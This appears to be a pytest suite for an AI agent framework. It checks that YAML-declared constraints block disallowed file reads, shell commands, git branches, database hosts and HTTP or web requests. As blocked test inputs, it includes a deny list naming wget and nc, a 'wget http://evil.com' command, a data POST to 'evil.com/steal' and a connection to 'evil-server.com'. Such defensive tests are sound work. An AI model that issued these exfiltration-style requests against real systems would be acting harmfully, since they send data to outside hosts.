"""Tests for constraint enforcement across ALL modules.

Every constraint declared in YAML must be enforced at runtime.
These tests verify that constraints actually block unauthorized operations.
"""

from __future__ import annotations
import asyncio
from _test_helpers import run_coro
import pytest
from pathlib import Path
from digitorn.modules.base import ExecutionContext


def _ctx(constraints: dict) -> ExecutionContext:
    return ExecutionContext(
        plan_id="test", action_id="test", constraints=constraints,
    )


class TestFilesystemConstraints:
    @pytest.fixture
    def fs(self):
        from digitorn.modules.filesystem.module import FilesystemModule
        return FilesystemModule()

    @pytest.mark.asyncio
    async def test_paths_blocks_outside(self, fs, tmp_path):
        from digitorn.modules.filesystem.params import ReadParams
        allowed = tmp_path / "allowed"
        allowed.mkdir()
        (allowed / "ok.txt").write_text("safe")
        outside = tmp_path / "outside"
        outside.mkdir()
        (outside / "secret.txt").write_text("secret")

        fs._context = _ctx({"paths": [str(allowed)]})
        r = await fs.read(ReadParams(path=str(outside / "secret.txt")))
        assert not r.success
        assert "outside" in r.error.lower()

    @pytest.mark.asyncio
    async def test_paths_allows_inside(self, fs, tmp_path):
        from digitorn.modules.filesystem.params import ReadParams
        (tmp_path / "ok.txt").write_text("content")
        fs._context = _ctx({"paths": [str(tmp_path)]})
        fs._read_files.add(str(tmp_path / "ok.txt"))
        r = await fs.read(ReadParams(path=str(tmp_path / "ok.txt")))
        assert r.success


class TestShellConstraints:
    @pytest.fixture
    def shell(self, tmp_path):
        from digitorn.modules.shell.module import ShellModule
        m = ShellModule()
        m._workspace = str(tmp_path)
        return m

    @pytest.mark.asyncio
    async def test_allowed_commands(self, shell):
        from digitorn.modules.shell.params import BashParams
        shell._context = _ctx({"allowed_commands": ["echo", "ls"]})
        r = await shell.bash(BashParams(command="echo hello"))
        assert r.success

    @pytest.mark.asyncio
    async def test_blocked_by_allowed_commands(self, shell):
        from digitorn.modules.shell.params import BashParams
        shell._context = _ctx({"allowed_commands": ["echo"]})
        r = await shell.bash(BashParams(command="ls /tmp"))
        assert not r.success
        assert "not in allowed_commands" in r.error

    @pytest.mark.asyncio
    async def test_blocked_commands(self, shell):
        from digitorn.modules.shell.params import BashParams
        shell._context = _ctx({"blocked_commands": ["wget", "nc"]})
        r = await shell.bash(BashParams(command="wget http://evil.com"))
        assert not r.success
        assert "blocked" in r.error.lower()

    @pytest.mark.asyncio
    async def test_no_constraints_allows_all(self, shell):
        from digitorn.modules.shell.params import BashParams
        shell._context = _ctx({})
        r = await shell.bash(BashParams(command="echo test"))
        assert r.success


class TestGitConstraints:
    @pytest.fixture
    def git(self, tmp_path):
        import subprocess
        from digitorn.modules.git.module import GitModule
        repo = tmp_path / "repo"
        repo.mkdir()
        subprocess.run(["git", "init"], cwd=repo, capture_output=True)
        subprocess.run(["git", "config", "user.email", "t@t.com"], cwd=repo, capture_output=True)
        subprocess.run(["git", "config", "user.name", "T"], cwd=repo, capture_output=True)
        (repo / "f.txt").write_text("x")
        subprocess.run(["git", "add", "."], cwd=repo, capture_output=True)
        subprocess.run(["git", "commit", "-m", "init"], cwd=repo, capture_output=True)
        m = GitModule()
        run_coro(m.on_config_update({"workspace": str(repo)}))
        return m

    @pytest.mark.asyncio
    async def test_allowed_branches_blocks(self, git):
        from digitorn.modules.git.params import CheckoutParams
        git._context = _ctx({"allowed_branches": ["main", "develop"]})
        r = await git.checkout(CheckoutParams(target="evil-branch"))
        assert not r.success
        assert "not in allowed_branches" in r.error

    @pytest.mark.asyncio
    async def test_no_constraint_allows(self, git):
        from digitorn.modules.git.params import BranchCreateParams
        git._context = _ctx({})
        r = await git.branch_create(BranchCreateParams(name="any-branch"))
        assert r.success


class TestNotebookConstraints:
    @pytest.fixture
    def nb(self):
        from digitorn.modules.notebook.module import NotebookModule
        return NotebookModule()

    @pytest.mark.asyncio
    async def test_paths_blocks_outside(self, nb, tmp_path):
        import json
        from digitorn.modules.notebook.params import ReadNotebookParams
        allowed = tmp_path / "allowed"
        allowed.mkdir()
        outside = tmp_path / "outside"
        outside.mkdir()
        nb_file = outside / "secret.ipynb"
        nb_file.write_text(json.dumps({
            "nbformat": 4, "nbformat_minor": 5,
            "metadata": {}, "cells": [],
        }))
        nb._context = _ctx({"paths": [str(allowed)]})
        r = await nb.read(ReadNotebookParams(path=str(nb_file)))
        assert not r.success
        assert "outside" in r.error.lower()

    @pytest.mark.asyncio
    async def test_paths_allows_inside(self, nb, tmp_path):
        import json
        from digitorn.modules.notebook.params import ReadNotebookParams
        nb_file = tmp_path / "ok.ipynb"
        nb_file.write_text(json.dumps({
            "nbformat": 4, "nbformat_minor": 5,
            "metadata": {"kernelspec": {"display_name": "Python 3"}},
            "cells": [{"cell_type": "code", "source": ["1+1"], "metadata": {}, "outputs": [], "execution_count": 1}],
        }))
        nb._context = _ctx({"paths": [str(tmp_path)]})
        r = await nb.read(ReadNotebookParams(path=str(nb_file)))
        assert r.success


class TestDatabaseConstraints:
    @pytest.mark.asyncio
    async def test_blocked_remote_host(self):
        from digitorn.modules.database.connections import ConnectionPool
        pool = ConnectionPool()
        with pytest.raises(ValueError, match="blocked"):
            await pool.connect(
                connection_id="evil",
                driver="postgresql",
                host="evil-server.com",
                database="stolen",
                allowed_hosts=[],
            )

    @pytest.mark.asyncio
    async def test_allowed_remote_host(self):
        from digitorn.modules.database.connections import ConnectionPool
        pool = ConnectionPool()
        try:
            await pool.connect(
                connection_id="ok",
                driver="postgresql",
                host="db.company.com",
                database="app",
                allowed_hosts=["db.company.com"],
            )
        except ValueError:
            pytest.fail("Should not raise for allowed host")
        except Exception:
            pass

    @pytest.mark.asyncio
    async def test_localhost_always_allowed(self):
        from digitorn.modules.database.connections import ConnectionPool
        pool = ConnectionPool()
        try:
            await pool.connect(
                connection_id="local",
                driver="sqlite",
                database=":memory:",
            )
        except ValueError:
            pytest.fail("localhost should always be allowed")


class TestHTTPConstraints:
    @pytest.fixture
    def http(self):
        from digitorn.modules.http.module import HttpModule
        m = HttpModule()
        run_coro(m.on_start())
        return m

    @pytest.fixture
    def http_with_security(self):
        """HTTP module with security profile active (POST to external blocked)."""
        from digitorn.modules.http.module import HttpModule
        m = HttpModule()
        m._has_security_profile = True
        run_coro(m.on_start())
        return m

    @pytest.mark.asyncio
    async def test_post_blocked_with_security_profile(self, http_with_security):
        """POST to external hosts is blocked when a security profile is active."""
        from digitorn.modules.http.params import PostParams
        r = await http_with_security.post(PostParams(url="https://evil.com/steal", data={"x": "y"}))
        assert not r.success
        assert "blocked" in r.error.lower()

    @pytest.mark.asyncio
    async def test_post_allowed_without_security_profile(self, http):
        """POST is allowed when no security profile (dev/trusted mode)."""
        from digitorn.modules.http.params import PostParams
        # Without security profile, POST goes through (may fail for other reasons
        # like DNS/network, but should NOT be blocked by egress policy).
        r = await http.post(PostParams(url="https://evil.com/steal", data={"x": "y"}))
        assert "blocked" not in (r.error or "").lower()

    @pytest.mark.asyncio
    async def test_get_allowed_without_hosts(self, http):
        """GET without allowed_hosts should not be blocked by egress policy."""
        from digitorn.modules.http.params import GetParams
        r = await http.get(GetParams(url="https://httpbin.org/get"))
        # The request may fail for network/SSL reasons (IP pinning + SNI),
        # but it must NOT be blocked by the egress policy.
        assert "blocked" not in (r.error or "").lower()


class TestWebConstraints:
    @pytest.fixture
    def web(self):
        from digitorn.modules.web.module import WebModule
        m = WebModule()
        run_coro(
            m.on_config_update({"egress": {"blocked_domains": ["evil.com"]}})
        )
        return m

    @pytest.mark.asyncio
    async def test_blocked_domain(self, web):
        from digitorn.modules.web.params import FetchParams
        r = await web.fetch(FetchParams(url="https://evil.com"))
        assert not r.success
        assert "blocked" in r.error.lower()
